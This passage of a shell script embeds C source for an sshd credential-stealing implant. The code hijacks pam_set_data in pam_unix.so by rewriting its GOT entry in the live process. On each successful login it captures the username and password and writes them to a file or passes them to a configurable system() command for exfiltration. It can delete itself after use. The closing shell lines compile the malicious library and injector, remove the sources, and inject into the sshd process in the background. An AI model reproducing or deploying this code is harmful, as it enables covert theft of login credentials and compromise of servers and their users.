    struct rel_info info;

    get_dyn_section(base_addr, &dyn);
    get_rel_info(dyn.addr, dyn.size, &info);

    Elf64_Rela *rel_table = (Elf64_Rela *)info.rel_plt_addr;
    Elf64_Sym *sym_table = (Elf64_Sym *)info.sym_tab_addr;
    char *str_table = (char *)info.str_tab_addr;

    for (int i = 0; i < info.rel_plt_size / sizeof(Elf64_Rela); i++) {
        /* 由重定位项定位符号, 再由符号定位函数名 */
        uint32_t symbol_index = ELF64_R_SYM(rel_table[i].r_info);
        uint32_t name_offset = sym_table[symbol_index].st_name;
        char *current_name = &str_table[name_offset];

        if (strcmp(func_name, current_name) == 0) {
            /* r_offset 是相对模块基址的偏移: GOT 表项地址 = 基址 + r_offset */
            uint64_t *addr = (uint64_t *)(rel_table[i].r_offset + (uint64_t)base_addr);

            update_entry(addr, old_entry, target_entry);
            break;
        }
    }

    return 0;
}

/* 从 ELF 头出发, 找到 PT_DYNAMIC 段的地址与大小 */
static int get_dyn_section(void *base_addr, struct dynamic_segment *dyn)
{
    if (base_addr == NULL || dyn == NULL) {
        return 0;
    }

    /* 校验 ELF 魔数 */
    Elf64_Ehdr *header = (Elf64_Ehdr *)(base_addr);
    if (memcmp(header->e_ident, "\177ELF", 4) != 0) {
        return -1;
    }

    /* program header table 实际地址 */
    Elf64_Phdr *phdr_table = (Elf64_Phdr *)((uint64_t)base_addr + header->e_phoff);
    if (phdr_table == 0) {
        return -1;
    }
    size_t phdr_count = header->e_phnum;

    /* 遍历 program header table, p_type 为 PT_DYNAMIC 的即动态段 */
    for (int j = 0; j < phdr_count; j++) {
        if (phdr_table[j].p_type == PT_DYNAMIC) {
            dyn->addr = (Elf64_Dyn *)(phdr_table[j].p_vaddr + (uint64_t)base_addr);
            dyn->size = phdr_table[j].p_memsz;
            break;
        }
    }
    return 0;
}

/* 遍历动态段, 提取重定位相关的 DT_* 条目 */
static void get_rel_info(Elf64_Dyn *dynamic_table, uint32_t dynamic_size, struct rel_info *info)
{
    if (info == NULL) {
        return;
    }

    for (int i = 0; i < dynamic_size / sizeof(Elf64_Dyn); i++) {
        if (dynamic_table[i].d_tag == DT_JMPREL) {
            info->rel_plt_addr = dynamic_table[i].d_un.d_ptr;
        }
        if (dynamic_table[i].d_tag == DT_STRTAB) {
            info->str_tab_addr = dynamic_table[i].d_un.d_ptr;
        }
        if (dynamic_table[i].d_tag == DT_PLTRELSZ) {
            info->rel_plt_size = dynamic_table[i].d_un.d_val;
        }
        if (dynamic_table[i].d_tag == DT_SYMTAB) {
            info->sym_tab_addr = dynamic_table[i].d_un.d_ptr;
        }
        if (dynamic_table[i].d_tag == DT_PLTREL) {
            // DT_RELA = 7
            // DT_REL = 17
            info->rel_type = dynamic_table[i].d_un.d_val;
        }
    }
}

/* 修改 GOT 表项: 先把所在页改为可写, 保存旧值后覆盖为新值 */
static void update_entry(uint64_t *addr, uint64_t *old_entry, uint64_t target_entry)
{
    /* 获取当前内存分页大小, 并按页对齐拿到表项所在页的起始地址 */
    uint64_t page_size = sysconf(_SC_PAGESIZE);
    uint64_t mem_page_start = (uint64_t)addr & (~(page_size - 1));
    mprotect((void *)mem_page_start, page_size, PROT_READ | PROT_WRITE | PROT_EXEC);
    if (old_entry != NULL) {
        *old_entry = *addr;
    }
    *addr = target_entry;
}

/* ======================= pam_set_data 劫持 ======================= */

typedef int (*pam_set_data_fn_t)(struct pam_handle *, const char *, void *, void *);

static pam_set_data_fn_t old_pam_set_data = NULL; /* 原始 pam_set_data, 由 hook_entry 填充 */

/*
 * pam_set_data 的劫持实现.
 * pam_unix 结束认证时会设置名为 "unix_setcred_return" 的数据项,
 * data 指向认证返回值: 0 表示认证成功, 此时 pam_handle 中
 * 已经保存了用户名(user)与密码(authtok), 在这里完成捕获与外发.
 */
int my_pam_set_data(struct pam_handle *pamh, const char *module_data_name, void *data, void *cleanup)
{
    char unix_setcred_return[] = "unix_setcred_return";

    if (strstr(unix_setcred_return, module_data_name)) {
        int ret = *(int *)data;

        if (ret == 0) { /* 认证成功 */
            if (SEND_MODE == 0) {
                /* 写文件模式: 追加写入用户名与密码 */
                FILE *fp = fopen(SEND_TARGET, "a+");
                if (fp != NULL) {
                    fprintf(fp, "login successful username is : %s    password is: %s\n", pamh->user, pamh->authtok);
                    fclose(fp);
                }
            } else {
                /* 命令模式: SEND_TARGET 作为格式化模板执行, 需包含两个 %s */
                char message[1024];
                snprintf(message, sizeof(message), SEND_TARGET, pamh->user, pamh->authtok);
                system(message);
            }
        }

        /* 静默销毁: 开启 SILENT_MODE 且认证成功时, 按用户名匹配后删除自身 so */
        if (SILENT_MODE == 1 && ret == 0) {
            if (strstr(SILENT_USER, "anyone") || strstr(SILENT_USER, pamh->user)) {
                char cmd[1024];
                snprintf(cmd, sizeof(cmd), "rm %s", EVIL_SO_PATH);
                system(cmd);
            }
        }
    }

    /* 透传调用原函数, 保证 PAM 流程不受影响 */
    return old_pam_set_data(pamh, module_data_name, data, cleanup);
}

/*
 * so 加载时的 constructor: 完成 pam_set_data 的 GOT 劫持.
 * 注意: constructor 属性必须写在函数定义上, 只写在前向声明上
 * 会被新版 GCC 静默忽略, 导致 so 加载后 hook 不生效.
 */
__attribute__((constructor)) static int so_init(void)
{
    /* pam_unix.so 即发起 pam_set_data 调用的模块 */
    void *base_addr = get_module_base(getpid(), "pam_unix.so");
    /* 按路径再次 dlopen 自身以取得句柄, 再从中解析出劫持函数地址 */
    void *handle = dlopen(EVIL_SO_PATH, RTLD_NOW);
    void *export_pam_set_data = dlsym(handle, "my_pam_set_data");
    hook_entry(base_addr, "pam_set_data", (uint64_t *)&old_pam_set_data, (uint64_t)export_pam_set_data);

    return 0;
}
EOF

# ======================= 配置回填与编译启动 =======================

# 将命令行配置回填到源码占位符
sed -i "s#THISISEVILSOPATH#${evil_so_path}#g" ${inject_c}
sed -i "s#THISISLIBCSTRING#${libc_string}#g" ${inject_c}
sed -i "s#THISISEVILSOPATH#${evil_so_path}#g" ${got_c}
sed -i "s#THISISPAYLOAD#${payload}#g" ${got_c}
sed -i "s#THISISMODE#${mode}#g" ${got_c}
sed -i "s#THISISSLIENTMODE#${silent_mode}#g" ${got_c}
sed -i "s#THISISSLIENTUSER#${silent_user}#g" ${got_c}

# 编译恶意 so 与注入器, 清理临时源码, 后台启动注入
gcc -shared ${got_c} -ldl -fPIC -o ${evil_so_path} -std=c99
gcc ${inject_c} ${shellcode_s} -g -o ${inject_bin} -ldl -lpthread
rm ${inject_c} ${shellcode_s} ${got_c}
nohup ${inject_bin} ${sshd_pid} >/dev/null 2>&1 &
